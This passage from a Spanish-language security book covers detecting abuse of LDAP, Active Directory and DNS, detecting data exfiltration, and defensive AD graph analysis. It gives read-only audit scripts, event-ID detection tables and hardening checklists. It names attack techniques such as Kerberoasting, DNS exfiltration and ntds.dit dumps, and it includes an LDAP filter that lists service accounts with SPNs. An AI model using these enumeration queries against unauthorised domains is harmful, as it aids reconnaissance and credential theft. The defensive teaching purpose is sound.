* [ ] Alertas SIEM para servicios nuevos (7045) y logons remotos (4624 Type 3).
* [ ] Cuentas administrativas separadas por nivel.
* [ ] Parches actualizados para vulnerabilidades locales.
* [ ] Segmentación interna de red efectiva.

---

## 9. Recursos recomendados

* **MITRE ATT&CK T1550.002 / T1558.001:** Pass-the-Hash y Pass-the-Ticket.
* **Microsoft Defender for Identity:** detección nativa de movimiento lateral.
* **Sysinternals Suite:** PsExec, AccessChk, Autoruns, Procmon.
* **CIS Benchmarks para Active Directory.**
* **SANS DFIR Playbooks:** respuesta a credenciales comprometidas.

---

## Conclusión

El movimiento lateral no depende solo de herramientas ofensivas: se basa en la gestión deficiente de credenciales y segmentación. Detectar sus señales —eventos, correlaciones y flujos anómalos— permite interrumpir un ataque antes de la exfiltración.
Con políticas adecuadas, monitoreo continuo y ejercicios de laboratorio seguros, tu equipo puede identificar y contener cualquier intento de reutilización de credenciales de forma ética y efectiva.

---

# Capítulo 29 — Abuso de servicios de red internos

**LDAP, Active Directory y DNS internos (detección, auditoría y defensa)**

---

## Objetivos

* Comprender la estructura y funciones críticas de **Active Directory (AD)** y **LDAP** en redes empresariales.
* Identificar configuraciones peligrosas o vulnerables que facilitan reconocimiento o escalada.
* Aprender cómo monitorear y auditar estos servicios para detectar abuso interno.
* Diseñar scripts de **auditoría defensiva** (solo lectura) en PowerShell y Python para recopilar información de seguridad sin manipular AD.

> **Aviso ético-legal:** Este capítulo no enseña cómo exfiltrar, modificar ni abusar de información de AD. Los ejemplos y scripts son **de lectura y diagnóstico**, para administradores o analistas de seguridad con autorización.

---

## 1. Active Directory y LDAP — resumen técnico

### LDAP (Lightweight Directory Access Protocol)

Protocolo de consulta jerárquica usado por AD y otros directorios.
Permite autenticar, consultar y modificar objetos (usuarios, grupos, políticas, equipos, etc.).

**Estructura típica:**

* *Base DN:* raíz del dominio (`DC=empresa,DC=local`)
* *Objetos:* `CN=Users`, `OU=Computers`, etc.
* *Atributos:* `sAMAccountName`, `memberOf`, `objectSid`, `lastLogon`, etc.

**Puertos estándar:**

* 389 (LDAP) y 636 (LDAPS).

---

### Active Directory (AD)

Infraestructura central de autenticación y autorización en entornos Windows.
AD usa LDAP como capa de consulta y Kerberos/NTLM como mecanismos de autenticación.

**Componentes principales:**

* *Domain Controller (DC)*: almacena base de datos AD (`ntds.dit`).
* *Global Catalog (GC):* replica atributos críticos para búsquedas rápidas.
* *DNS interno:* resuelve nombres de dominio y controla delegaciones.

---

## 2. Abusos comunes y vectores internos (para detección, no ejecución)

| Abuso conceptual                  | Descripción                                                | Riesgo                  | Detección recomendada                             |
| --------------------------------- | ---------------------------------------------------------- | ----------------------- | ------------------------------------------------- |
| **LDAP enumeration**              | Consultas amplias para listar usuarios, grupos, políticas. | Fuga de información     | Logs 1644 y 2889 (eventos LDAP).                  |
| **Kerberoasting / ASREPRoasting** | Solicitud de tickets Kerberos para crackeo offline.        | Robo de credenciales    | Eventos 4768/4769 + correlación con IPs anómalas. |
| **DNS zone transfer interna**     | Copia completa del DNS del dominio.                        | Mapeo de red            | Logs DNS ID 6001 y correlación SIEM.              |
| **Misconfigured ACLs en AD**      | Permiten modificar atributos sensibles (delegación, GPOs). | Escalada de privilegios | Auditoría de ACLs y cambios (Event ID 5136).      |
| **Anonymous binds**               | Conexión sin autenticación a LDAP.                         | Fuga de info            | Revisar políticas LDAP Signing y Require Auth.    |

---

## 3. Auditoría ética: configuraciones críticas

### 3.1 LDAP sin firma o sin canal seguro

Verifica políticas:

```powershell
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" | 
Select 'LDAPServerIntegrity'
```

* Valor `2` → requiere LDAP signing (seguro).
* Valor `0` → vulnerable (sin firma).

### 3.2 Anonymous bind habilitado

```powershell
Get-ADDomainController -Filter * | Select-Object Name, IsGlobalCatalog, Enabled
```

Si `Anonymous` aparece en registros de eventos, el servidor permite binds no autenticados.

### 3.3 ACLs de objetos AD

Audita delegaciones excesivas:

```powershell
(Get-Acl "AD:\CN=Users,DC=empresa,DC=local").Access | 
Where-Object { $_.ActiveDirectoryRights -match "Write" }
```

Esto lista quién tiene permisos de escritura en contenedores críticos.

---

## 4. DNS interno: riesgos y monitoreo

**Ataques comunes:**

* Zone transfer (`AXFR`) para obtener todas las entradas DNS.
* Envenenamiento de cache DNS (man-in-the-middle).
* Delegaciones erróneas (permiten dominio huérfano o takeover).

**Medidas defensivas:**

* Deshabilitar zone transfers (`AllowZoneTransfer` en registros).
* Usar DNSSEC o validación interna.
* Registrar eventos DNS y correlacionar solicitudes masivas inusuales.
* Controlar acceso a puertos 53 TCP/UDP solo para resolvers legítimos.

---

## 5. Script defensivo — “AD-SecureAudit” (PowerShell)

Audita la configuración de AD y LDAP en modo **solo lectura**:

```powershell
<#
AD-SecureAudit v1.0
Auditoría defensiva de Active Directory y LDAP
#>

Write-Host "=== AD Secure Audit ===" -ForegroundColor Cyan

# 1. Verificar LDAP Signing
$ldapSign = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" | Select LDAPServerIntegrity
Write-Host "`n[LDAP Signing Level]" -ForegroundColor Yellow
$ldapSign

# 2. Comprobar canal LDAPS
$ldaps = Test-NetConnection -ComputerName (Get-ADDomainController).HostName -Port 636
Write-Host "`n[LDAPS Connection Test]" -ForegroundColor Yellow
$ldaps

# 3. Buscar permisos peligrosos en contenedores críticos
Write-Host "`n[Delegaciones Write en CN=Users]" -ForegroundColor Yellow
(Get-Acl "AD:\CN=Users,$((Get-ADDomain).DistinguishedName)").Access | 
Where-Object { $_.ActiveDirectoryRights -match "Write" }

# 4. DNS Zone Transfer deshabilitado
Write-Host "`n[DNS Zone Transfer Policy]" -ForegroundColor Yellow
Get-DnsServerZone | Select-Object ZoneName,AllowZoneTransfer
```

Este script no lee usuarios ni contraseñas: sólo evalúa configuraciones de seguridad y reporta riesgos.

---

## 6. Detección de abuso de servicios internos

### LDAP

* Event ID **2889**: conexión LDAP sin autenticación.
* Event ID **1644**: consultas LDAP costosas o anómalas (indicadores de enumeración).
* Configurar auditoría con `Directory Service Access` en GPO.

### Kerberos

* **4768 (AS-REQ)** y **4769 (TGS-REQ)**: solicitudes anómalas de tickets.
* Detectar múltiples solicitudes de tickets por el mismo usuario en poco tiempo.

### DNS

* **Event 6001**: zone transfer iniciado.
* **Event 5504/5505**: errores en registros dinámicos (posible manipulación).

### SIEM Rules

Correlaciona:
`[LDAP 2889] + [4769] + [DNS 6001]` → posible reconocimiento interno.
Aumentar prioridad si proviene de equipos que no son Domain Controllers.

---

## 7. Hardening: defensa estructural

**LDAP**

* Habilitar *LDAP Signing* (`LDAPServerIntegrity=2`).
* Deshabilitar *Anonymous binds*.
* Usar LDAPS (puerto 636, TLS).

**Active Directory**

* Revisar delegaciones (`DelegateTo`), privilegios `GenericAll`, `GenericWrite`.
* Auditar grupos con permisos `Domain Admins`, `Enterprise Admins`.
* Activar “Protected Users” group para cuentas privilegiadas.
* Usar *Read-only Domain Controllers (RODC)* donde aplique.

**DNS**

* Deshabilitar transfers (`AllowZoneTransfer=No`).
* Activar registro detallado y retención de logs.
* Validar delegaciones con `dnscmd /info`.

---

## 8. Playbook de respuesta ante abuso interno

| Fase                        | Acción                                                                                    | Herramienta           |
| --------------------------- | ----------------------------------------------------------------------------------------- | --------------------- |
| **1. Detección**            | Alertas por eventos 2889, 4769, 6001.                                                     | SIEM                  |
| **2. Contención**           | Revocar cuentas sospechosas, bloquear IPs, deshabilitar LDAPS temporales si es necesario. | AD Tools / Firewall   |
| **3. Análisis**             | Revisar logs de DC y correlacionar con tiempos de red.                                    | Event Viewer / Sysmon |
| **4. Erradicación**         | Ajustar ACLs, reforzar GPO, deshabilitar anonymous binds.                                 | PowerShell / GPO      |
| **5. Recuperación**         | Revisar replicación AD y DNS; verificar integridad.                                       | repadmin, dnscmd      |
| **6. Lecciones aprendidas** | Actualizar reglas SIEM, mejorar segmentación.                                             | SOC Procedures        |

---

## 9. Ejercicio de laboratorio ético

Objetivo: entrenar detección, no abuso.

1. Configura dos VMs: una como Domain Controller y otra como auditor.
2. En la VM auditor, ejecuta `AD-SecureAudit.ps1`.
3. Introduce configuraciones inseguras de prueba (p. ej. habilitar anonymous bind).
4. Observa los eventos generados (2889, 1644) y ajusta las alertas del SIEM.
5. Revertir configuraciones y volver a auditar para confirmar remediación.

---

## 10. Checklist de seguridad

* [ ] Anonymous Bind deshabilitado.
* [ ] LDAPS operativo.
* [ ] Zone Transfers deshabilitados.
* [ ] GPOs auditadas.
* [ ] Delegaciones revisadas.
* [ ] Monitoreo de eventos 2889, 4768, 4769, 6001 activo.
* [ ] Script AD-SecureAudit ejecutado regularmente.

---

## Conclusión

El abuso de servicios internos como LDAP, AD y DNS no depende de exploits complejos, sino de configuraciones mal aseguradas. La mejor defensa es una auditoría constante, registros bien configurados y segmentación. Este capítulo te brinda las herramientas éticas para detectar, corregir y endurecer tu infraestructura interna de forma responsable.

---

# Capítulo 30 — Exfiltración de datos

**Canales encubiertos, compresión, chunking y transmisión segura (detección y defensa)**

---

## Objetivos

* Comprender las rutas y canales más usados en intentos de exfiltración.
* Implementar mecanismos de detección, registro y bloqueo.
* Auditar transferencias legítimas y controlar el flujo de datos salientes.
* Analizar patrones anómalos de tráfico y tamaño de paquetes.
* Desarrollar herramientas éticas para verificación de seguridad, no para fuga de datos.

> **Aviso ético y legal:** Este capítulo no enseña cómo enviar ni ocultar información fuera de una red. Su propósito es **entrenar analistas defensivos** y **equipos Red Team autorizados** en la comprensión y detección de técnicas de exfiltración.

---

## 1. Conceptos fundamentales

La **exfiltración de datos** ocurre cuando información confidencial abandona la red interna sin autorización. Puede ser intencional (insider o ataque) o accidental (errores de configuración).

**Fases típicas:**

1. Recolección de información (data staging).
2. Compresión y empaquetado (para reducir tamaño).
3. Transmisión a destino externo.

**Vectores comunes:**

* Protocolos normales (HTTP, HTTPS, DNS, ICMP, SMTP, FTP, SMB).
* Canales laterales (Bluetooth, USB, cloud storage).
* Codificación o fragmentación (“chunking”) para evadir detección.

---

## 2. Rutas de exfiltración más comunes y detección

| Canal             | Ejemplo de abuso                                          | Contramedida                                          |
| ----------------- | --------------------------------------------------------- | ----------------------------------------------------- |
| **HTTP/HTTPS**    | Cargas a servicios externos (Dropbox, API no autorizada). | Proxy con inspección TLS, DLP (Data Loss Prevention). |
| **DNS**           | Subdominios codificados (exfil por consultas).            | Detección de longitud de consultas y entropía alta.   |
| **ICMP/Ping**     | Datos dentro de payloads ICMP.                            | Bloquear ICMP saliente o registrar tamaño anómalo.    |
| **Email (SMTP)**  | Envío adjuntos no cifrados.                               | Filtros DLP y escaneo de adjuntos.                    |
| **Cloud storage** | Sync no autorizado (Google Drive personal).               | Políticas CASB, listas blancas de dominios.           |

---

## 3. Compresión y chunking

Los atacantes suelen comprimir datos antes de exfiltrarlos.
Para auditoría y detección:

* Registra archivos comprimidos en rutas temporales (`/tmp`, `%TEMP%`).
* Revisa herramientas no corporativas de compresión (WinRAR, 7zip).
* Detecta patrones de archivos `.zip`, `.7z`, `.rar` recién creados.

**Chunking** (fragmentar datos en trozos pequeños) puede verse como múltiples paquetes o conexiones cortas con payload similar.
Un SIEM puede detectar esto correlacionando múltiples eventos similares por IP en intervalos breves.

---

## 4. Script defensivo — “DataGuard Auditor” (Python)

Este script **no transmite datos**: audita archivos comprimidos, tamaños inusuales y conexiones salientes activas.

```python
#!/usr/bin/env python3
"""
DataGuard Auditor v1.0
Propósito: detectar signos de exfiltración en sistemas locales.
Modo: solo lectura, sin enviar datos.
"""

import os, psutil, json, time, socket

report = {
    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
    "compressed_files": [],
    "active_connections": [],
    "large_temp_files": []
}

# 1. Buscar archivos comprimidos recientes
for root, _, files in os.walk("/tmp"):
    for f in files:
        if f.endswith((".zip", ".rar", ".7z", ".tar.gz")):
            path = os.path.join(root, f)
            if time.time() - os.path.getmtime(path) < 3600:
                report["compressed_files"].append(path)

# 2. Conexiones activas
for conn in psutil.net_connections(kind="inet"):
    if conn.raddr:
        report["active_connections"].append({
            "laddr": f"{conn.laddr.ip}:{conn.laddr.port}",
            "raddr": f"{conn.raddr.ip}:{conn.raddr.port}",
            "status": conn.status
        })

# 3. Archivos grandes en /tmp o %TEMP%
for root, _, files in os.walk("/tmp"):
    for f in files:
        path = os.path.join(root, f)
        try:
            if os.path.getsize(path) > 50 * 1024 * 1024:
                report["large_temp_files"].append(path)
        except:
            continue

with open("dataguard_audit.json", "w") as f:
    json.dump(report, f, indent=2)

print("[✔] Auditoría completada. Reporte: dataguard_audit.json")
```

**Función:** detecta comportamientos sospechosos asociados a staging o compresión previa a una exfiltración.
**No envía ni modifica nada.**

---

## 5. Detección de patrones de exfiltración en red

### Indicadores clave

* Transferencias salientes con tamaños uniformes y alta frecuencia.
* Paquetes DNS con payload inusual o longitudes mayores a 100 caracteres.
* Tráfico HTTP con destino desconocido y frecuencia constante.
* Actividad nocturna o fuera de horario con alto ancho de banda.

**Mitigaciones:**

* Limitar tamaño máximo de paquetes salientes.
* Usar IDS/IPS (Suricata, Zeek) con reglas específicas.
* Integrar DLP y CASB para controlar uploads.
* Inspeccionar SSL/TLS con certificados corporativos.

---

## 6. Playbook de respuesta ante exfiltración

| Fase                        | Acción                                               | Herramienta      |
| --------------------------- | ---------------------------------------------------- | ---------------- |
| **1. Detección**            | Alertas DLP, IDS o logs de proxy.                    | SIEM, Zeek       |
| **2. Contención**           | Aislar host, bloquear tráfico en firewall.           | SOAR, EDR        |
| **3. Análisis**             | Revisar logs de red, comprobar archivos comprimidos. | ELK, Wireshark   |
| **4. Erradicación**         | Eliminar malware o scripts no autorizados.           | AV/EDR           |
| **5. Recuperación**         | Cambiar credenciales afectadas, restaurar backups.   | SOC Procedures   |
| **6. Lecciones aprendidas** | Fortalecer monitoreo, revisar configuraciones proxy. | DLP, SIEM tuning |

---

## 7. Ejercicio ético de laboratorio

**Objetivo:** simular detección de anomalías sin fuga real de datos.

1. Crea un archivo de texto grande (simulación de dataset).
2. Comprime el archivo en `/tmp`.
3. Ejecuta `DataGuard Auditor` y verifica si lo detecta.
4. Simula conexión a servidor interno (sin Internet) para monitoreo.
5. Configura una regla en SIEM para alertar cuando se cree un `.zip` > 50 MB.

Este ejercicio enseña detección temprana de staging sin transmitir nada.

---

## 8. Checklist de seguridad

* [ ] Proxy con inspección TLS.
* [ ] IDS/IPS monitoreando tráfico interno.
* [ ] DLP configurado para correo, web y USB.
* [ ] Limitación de tamaño de archivos comprimidos en rutas temporales.
* [ ] Monitorización de logs DNS y HTTP.
* [ ] Auditoría semanal con DataGuard Auditor.
* [ ] Segmentación de red para evitar salida directa a Internet.
* [ ] Alerta de tráfico fuera de horario.

---

## 9. Recursos recomendados

* **MITRE ATT&CK:** T1048 (Exfiltration Over Alternative Protocol).
* **CIS Controls:** Control 13 — Data Protection.
* **Zeek y Suricata:** reglas para detección de exfiltración.
* **Microsoft Defender DLP y CASB.**
* **SANS DFIR:** “Detecting Data Exfiltration Patterns”.

---

## Conclusión

La exfiltración no ocurre en un instante: siempre deja huellas en disco, red y logs. Con herramientas de auditoría, correlación de eventos y políticas de prevención, se puede identificar antes de que el daño sea irreversible. La clave está en la visibilidad y la ética: comprender cómo funciona la exfiltración sin jamás reproducirla en producción.

---

## Parte V — Active Directory y entornos Windows

# Capítulo 31 — Fundamentos de Active Directory para Red Teamers

**Objetivo:** explicar la arquitectura, objetos clave, permisos y flujos de autenticación de Active Directory (AD) desde una perspectiva técnica y responsable; mostrar consultas LDAP **de auditoría/diagnóstico** en Python (lectura, solo con credenciales y autorización).
**Aviso obligatorio:** toda interacción con AD **requiere** autorización escrita. Los ejemplos de código son **solo** para auditoría legítima en entornos donde tengas permiso. No uses estos métodos para escanear o extraer datos de dominios ajenos.

---

## 1 — Panorama: por qué AD importa para Red Teamers (éticos) y defensores

AD centraliza usuarios, equipos, grupos, políticas y delegaciones en la mayoría de redes Windows empresariales. Para un Red Teamer responsable, conocer AD permite **evaluar riesgos**, plantear pruebas autorizadas y colaborar con Blue Team en mejorar la detección. Para defensores, conocer los mismos conceptos permite diseñar controles que inhiban movimientos laterales y abuso de privilegios.

---

## 2 — Objetos básicos de Active Directory (qué son y para qué sirven)

* **Domain (DC)**: unidad administrativa y espacio de nombres (ej. `corp.local`).
* **Domain Controller (controlador de dominio)**: host que replica `ntds.dit` y responde LDAP/Kerberos/DNS.
* **OU (Organizational Unit):** contenedores para agrupar objetos (users, computers) y aplicar GPOs.
* **User (user object):** cuenta de usuario (`sAMAccountName`, `userPrincipalName`, atributos: `memberOf`, `pwdLastSet`, `lastLogon`).
* **Computer (computer object):** equipos unidos al dominio.
* **Group (security/distribution):** seguridad y asignación de permisos (`member`, `memberOf`).
* **Service Account (gMSA, managed, regular):** cuentas usadas por servicios; algunas requieren atención especial.
* **GPO (Group Policy Object):** políticas aplicadas a OUs/domains/sites.
* **ACL / ACE (Access Control List / Entry):** permisos sobre objetos (quién puede leer, escribir, control total, etc).

---

## 3 — Permisos y ACL: entender el modelo de control de acceso

* Cada objeto AD tiene una **ACL** que contiene **ACEs**. Las ACEs pueden permitir o denegar operaciones (ReadProperty, WriteProperty, GenericAll, etc.).
* **Delegaciones peligrosas:** `GenericAll` o `WriteOwner` sobre contenedores críticos permiten escaladas.
* **Principio:** audita quién tiene `Write` sobre `memberOf`, quién puede `resetPassword`, quién puede `AddMember` a grupos privilegiados.
* Herramientas defensivas: `Get-Acl` en `AD:\` (PowerShell) y revisión de `msDS-AllowedToDelegateTo` (delegation attributes).

---

## 4 — Flujos de autenticación (resumen técnico)

* **Kerberos (recomendado / default en AD):**

  1. Usuario solicita TGT al KDC (DC) → Event 4768 (AS-REQ).
  2. Si validado, KDC entrega TGT. Cuando quiere acceder a servicio, solicita TGS para servicio destino → Event 4769 (TGS-REQ).
  3. Servicio verifica TGS; si válido, permite acceso.

  * Validaciones: `aud`/`sname`, `flags`, `enc_type`.
* **NTLM (fallback):** challenge/response basado en hashes (`NTLMv2` preferible). Es más susceptible a abuso si está ampliamente permitido.
* **LDAP bind:** cliente (app/agent) puede hacer bind simple (user/pass) o bind SASL/Kerberos (GSSAPI). LDAPS es LDAP sobre TLS (seguro).
* **SSO flows:** AD integra Kerberos, LDAP y sometimes ADFS/OIDC for federated auth.

---

## 5 — Qué consultas LDAP son útiles y **seguras** (auditoría / diagnóstico)

A continuación consultas **de solo lectura** para validar configuración y obtener inventario cuando tengas autorización. Usaremos la librería `ldap3` (Python). Siempre usar LDAPS (`ldaps://`) o StartTLS y credenciales con mínimos privilegios necesarios.

### Recomendaciones previas a ejecutar queries

1. Pide permiso por escrito y define scope (bases DN, OUs permitidas).
2. Usa cuentas con privilegios *delegados* (read-only) — evitar usar Domain Admin salvo necesidad justificada.
3. Registra y retén logs de la sesión.
4. Limita el volumen (paged results) para no causar impacto.

---

### Ejemplo: conexión LDAPS y búsqueda simple del propio usuario (Python, lectura)

```python
# ejemplo_safe_ldap.py  — uso responsable y solo-lectura
from ldap3 import Server, Connection, Tls, ALL, SUBTREE, ALL_ATTRIBUTES
import ssl, os

LDAP_HOST = os.environ.get('LDAP_HOST','dc01.corp.local')
LDAP_USER = os.environ.get('LDAP_USER')   # e.g. "corp\\auditor"
LDAP_PASS = os.environ.get('LDAP_PASS')

# Usar TLS (LDAPS)
tls = Tls(validate=ssl.CERT_REQUIRED)  # exigir certificado válido
server = Server(LDAP_HOST, use_ssl=True, get_info=ALL, tls=tls)

with Connection(server, user=LDAP_USER, password=LDAP_PASS, auto_bind=True) as conn:
    # Obtener base DN desde el servidor (si está disponible)
    base_dn = conn.server.info.other.get('defaultNamingContext', [None])[0]
    # Buscar el objeto del usuario conectado (autodetectado por sAMAccountName)
    if base_dn:
        result = conn.search(search_base=base_dn,
                             search_filter='(sAMAccountName={})'.format(LDAP_USER.split('\\')[-1]),
                             search_scope=SUBTREE,
                             attributes=['distinguishedName','memberOf','pwdLastSet','lastLogon'],
                             paged_size=50)
        for entry in conn.entries:
            print(entry.entry_to_json())
```

**Notas:**

* `paged_size` evita consumir demasiada memoria en el DC.
* El script pide credenciales por variables de entorno; NO las hardcodees.
* `memberOf` muestra pertenencias de grupo (útil para auditoría de privilegios).

---

### Ejemplo: consulta defensiva para inventario de Domain Controllers y roles FSMO

```python
# query_dc_fsmo.py — lectura/diagnóstico
from ldap3 import Server, Connection, ALL, SUBTREE
import os

LDAP_HOST = os.environ.get('LDAP_HOST','dc01.corp.local')
LDAP_USER = os.environ.get('LDAP_USER')
LDAP_PASS = os.environ.get('LDAP_PASS')

server = Server(LDAP_HOST, get_info=ALL)
with Connection(server, user=LDAP_USER, password=LDAP_PASS, auto_bind=True) as conn:
    base = conn.server.info.other.get('configurationNamingContext')[0]
    # Buscar objetos nTDSDSA que describen DCs
    conn.search(search_base=base,
                search_filter='(objectClass=nTDSDSA)',
                search_scope=SUBTREE,
                attributes=['distinguishedName','dnsHostName','msDS-HasInstantiatedNCs'])
    for e in conn.entries:
        print(e['dnsHostName'], e['msDS-HasInstantiatedNCs'])
    # FSMO roles se obtienen mejor vía RPC/AD modules (pero Info en LDAP/RootDSE)
    root = conn.server.info.other
    print("RootDSE keys:", conn.server.info.other.keys())
```

---

### Consulta defensiva: listar cuentas de servicio con contraseña no expirada (ejemplo conceptual)

Buscar cuentas con `servicePrincipalName` o `userAccountControl` flags típicos de cuentas de servicio puede ayudar a auditar riesgo — **hazlo solo si está en scope**.

```python
# conceptual_snippet.py
search_filter = '(|(servicePrincipalName=*)(userAccountControl:1.2.840.113556.1.4.803:=65536))'
# el primer filtro detecta SPNs (service accounts), el segundo es un ejemplo de flag bitmask (ejemplo conceptual).
```

(No ejecutes consultas masivas a todo el dominio sin paginación ni autorización).

---

## 6 — Herramientas que los Red Teamers responsables y defensores deben conocer

* **ldap3 / python-ldap** (Python) — para scripts de administración y auditoría.
* **PowerShell / ActiveDirectory module** (`Get-ADUser`, `Get-ADGroup`, `Get-ADDomainController`) — muy útil para administradores.
* **ADSI / dsquery / dsget** — legacy tools.
* **BloodHound** — modelado de relaciones AD y privilegios; **usar solo en engagements autorizados** y para mejorar detección. (útil también para defensores que quieren entender caminos de escalada).
* **PingCastle, ADRecon, ADExplorer (Sysinternals)** — auditoría y exploración defensiva.

> Recordatorio: algunas de estas herramientas (p. ej. BloodHound) se usan en ejercicios ofensivos; su uso fuera de un engagement autorizado está prohibido.

---

## 7 — Buenas prácticas de auditoría y evaluación (pre-engagement checklist)

1. **Autorización por escrito**: alcance, cuentas permitidas, windows/timebox.
2. **Cuentas mínimas**: crear cuentas read-only para auditoría.
3. **Rate limits / paged results**: evitar impacto en DCs.
4. **Registro y retención**: auditar tus propias consultas en SIEM.
5. **Comunicación**: tener contacto en TI/AD y plan de rollback si el DC muestra problemas.
6. **No ejecutar dumps masivos** (ntds.dit etc.) salvo en ejercicios específicos y autorizados con control forense.

---

## 8 — Indicadores y artefactos a revisar (defensiva)

* Cuentas con `pwdLastSet` antiguo + `badPwdCount` alto.
* Grupos con miembros inesperados en `memberOf` (p.ej. `Domain Admins`).
* Objetos con ACLs que conceden `ResetPassword` a cuentas no esperadas.
* SPNs inusuales (pueden implicar servicios que usan Kerberos).
* Uso de LDAP simple bind sin TLS (configuración insegura).

---

## 9 — Recomendaciones de mitigación rápida (defensiva)

* Forzar **LDAP signing** y **LDAPS**.
* Restringir **NTLM** y usar políticas `Network security: Restrict NTLM`.
* Implementar **LAPS** para contraseñas locales.
* Revisar y limitar **delegación** (unconstrained vs constrained).
* Monitorizar y alertar sobre cambios en grupos privilegiados y ACLs.
* Mantener DCs actualizados y con backups offline.

---

## 10 — Checklist operativo (resumen)

* [ ] Autorización y scope definido para auditorías AD.
* [ ] Usar cuentas con privilegios mínimos para consultas.
* [ ] Emplear LDAPS y paged searches.
* [ ] Registrar queries y resultados en SIEM.
* [ ] Revisar ACLs y delegaciones periódicamente.
* [ ] Mantener inventario de SPNs y cuentas de servicio.
* [ ] Probar detection rules para movimientos en AD (eventos 5136/5145/4740/4768/4769).

---

# Capítulo 32 — Enumeración avanzada de Active Directory (visión responsable)

**Objetivo:** explicar conceptos, riesgos, detección y cómo integrar y visualizar relaciones de Active Directory (grupos, privilegios, delegaciones) de forma **defensiva**. Evitaremos instrucciones operativas para herramientas ofensivas (BloodHound, PowerView, ldapsearch) y, en su lugar, mostraremos cómo **procesar y visualizar** datos autorizados y saneados para análisis y hardening.

> **Aviso obligatorio:** muchas herramientas de enumeración AD son dual-use. No proporcionaré comandos ni PoC que habiliten recolección ofensiva o explotación. Todo lo aquí propuesto es exclusivamente para: (a) administradores que tienen autorización para auditar su dominio, (b) equipos de seguridad que trabajan con datos previamente exportados y autorizados, y (c) ejercicios de laboratorio controlados con datasets sintéticos. Antes de cualquier recolección real: autorización escrita, scope, y coordinación con el equipo de AD.

---

## 1. Resumen ejecutivo — ¿por qué importa la enumeración avanzada?

La enumeración avanzada revela caminos de privilegio — quién puede hacer qué sobre qué objeto — y permite identificar rutas de escalada, cuentas de servicio con privilegios excesivos, delegaciones erróneas y grupos expuestos. Un mapa bien construido ayuda a priorizar remedios y crear reglas de detección.

Para defensores, el objetivo principal no es “buscar huecos para explotarlos”, sino:

* identificar **caminos de ataque** potenciales (modelado de riesgo),
* reducir la **superficie** (principio de mínimo privilegio),
* instrumentar detecciones y tests de regresión después de remediación.

---

## 2. Herramientas (visión conceptual)

* **BloodHound (concepto):** framework que modela relaciones AD (users, groups, computers, sessions, ACLs) en un grafo. Muy útil para modelado defensivo si se emplea con datos autorizados.
* **PowerView / other enumeration libs (concepto):** módulos para consultar AD y construir inventarios; sirven para auditoría si se usan legítimamente.
* **ldapsearch (concepto):** cliente LDAP para consultas; en defensiva se usa con cuentas read-only para inventario y verificación de configuraciones.

**Nota:** no se indicarán flags ni pasos para ejecutar estas herramientas aquí. En su lugar, veremos cómo trabajar *posteriormente* con la información que obtengas legalmente (exports CSV/JSON/graph) para análisis y visualización.

---

## 3. Qué datos son útiles y cómo deben ser tratados

Para análisis defensivo, normalmente necesitas (siempre: **solo** datos autorizados y saneados):

Nodos (ejemplos):

* users: id, sAMAccountName, displayName, lastLogon, pwdLastSet, enabled
* groups: id, name, privileged_flag (Domain Admins, etc.)
* computers: id, name, lastLogonTimestamp, OS
* serviceAccounts: id, spn flags, managed (gMSA)

Aristas/relaciones (ejemplos):

* memberOf (user → group)
* hasSession (user → computer)
* adminTo / writeOwner / all (account → object) — ACEs que indican poder
* allowedToDelegateTo, hasSPN, aclWrite (to represent delegations)

Metadatos para cada relación: timestamp, fuente (export tool), confidence, sanidad (hashed/sanitized).

**Buenas prácticas de manejo de datos:**

* Sanea/anonimiza PII si vas a compartir reportes; conserva mapping interno seguro.
* Versiona datasets (audit trail) y guarda hashes de los archivos fuente.
* Limita exposición del grafo a personal autorizado.
* Mantén separación entre datos de producción y datasets de laboratorio.

---

## 4. Integración y pipeline recomendado (defensivo)

1. **Recolección autorizada** — exportar desde AD/DC con cuenta read-only (paged queries, LDAPS), o tomar datasets de herramientas autorizadas.
2. **Saneamiento** — eliminar datos sensibles, añadir metadatos de procedencia y timestamps.
3. **Normalización** — transformar a formato canónico (CSV/JSON/edge list / node list).
4. **Almacenamiento seguro** — control de acceso, cifrado en reposo.
5. **Análisis y visualización** — construir grafo y aplicar algoritmos (shortest paths, centrality, community detection).
6. **Prioridad y remediación** — generar playbooks con pasos de corrección y tests de regresión.
7. **Repetición periódica** — scheduler para reevaluar y validar mitigaciones.

---

## 5. Métricas y algoritmos útiles para priorizar

* **Shortest path to privileged group (Domain Admins)**: identifica usuarios con rutas cortas a grupos privilegiados (riesgo alto).
* **Betweenness centrality / Eigenvector centrality**: identifica nodos críticos por tránsito de relaciones.
* **Out-degree / in-degree**: cuentas que administran muchos objetos o con muchas pertenencias.
* **Temporal change detection**: nuevas aristas o aumento de memberships recientes.
* **Weak link scoring**: combinar factores (hasSPN + pwd age + lastLogon > threshold) para priorizar.

Estos algoritmos son aplicables sobre el grafo ya recolectado; ofrecen una priorización accionable para mitigación.

---

## 6. Visualización automatizada (ejemplo seguro en Python)

A continuación un ejemplo **defensivo**: toma dos ficheros CSV (nodes.csv, edges.csv) preparados por el equipo de AD con autorización y genera una visualización interactiva HTML usando `networkx` + `pyvis`. **Este código NO recolecta datos de AD** — asume que los CSVs existen y ya están saneados.

Guarda este script como `ad_graph_visualizer.py` y úsalo solo con datos autorizados.

```python
#!/usr/bin/env python3
"""
ad_graph_visualizer.py
- Entrada: nodes.csv (id,type,label,privileged_flag), edges.csv (source,target,rel_type,weight)
- Salida: ad_graph.html (visualización interactiva)
USO: python3 ad_graph_visualizer.py nodes.csv edges.csv ad_graph.html
"""
import sys, csv
from pyvis.network import Network
import networkx as nx

if len(sys.argv) != 4:
    print("Usage: python3 ad_graph_visualizer.py nodes.csv edges.csv out.html")
    sys.exit(1)

nodes_file, edges_file, out_html = sys.argv[1], sys.argv[2], sys.argv[3]

G = nx.DiGraph()

# Load nodes
with open(nodes_file, newline='', encoding='utf-8') as fh:
    reader = csv.DictReader(fh)
    for r in reader:
        node_id = r.get('id') or r.get('cn') or r.get('name')
        ntype = r.get('type','unknown')
        label = r.get('label', node_id)
        privileged = r.get('privileged_flag','false').lower() in ('1','true','yes')
        # store attributes
        G.add_node(node_id, label=label, type=ntype, privileged=privileged)

# Load edges
with open(edges_file, newline='', encoding='utf-8') as fh:
    reader = csv.DictReader(fh)
    for r in reader:
        s = r.get('source')
        t = r.get('target')
        rel = r.get('rel_type','rel')
        w = float(r.get('weight',1.0))
        if s and t:
            G.add_edge(s, t, rel=rel, weight=w)

# Build pyvis network
